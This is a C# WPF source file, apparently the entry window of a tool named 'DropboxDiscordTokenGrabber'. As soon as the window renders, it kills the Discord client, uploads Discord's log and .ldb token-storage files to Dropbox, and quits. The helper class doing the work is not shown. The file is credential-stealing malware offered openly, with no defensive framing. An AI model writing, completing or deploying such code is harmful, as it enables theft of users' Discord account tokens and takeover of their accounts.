using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Diagnostics;
using Dropbox.Api;
using Dropbox.Api.Files;

namespace DropboxDiscordTokenGrabber
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        // Do the juicy tricks after the WPF Window is loaded correctly
        bool _shown;
        protected override void OnContentRendered(EventArgs e)
        {
            base.OnContentRendered(e);

            if (_shown)
                return;

            _shown = true;

            // Magic starts here
            Grabbing.KillDiscord();
            Grabbing.UploadLogFile();
            Grabbing.UploadldbFile();
            System.Windows.Application.Current.Shutdown();
        }
    }
}
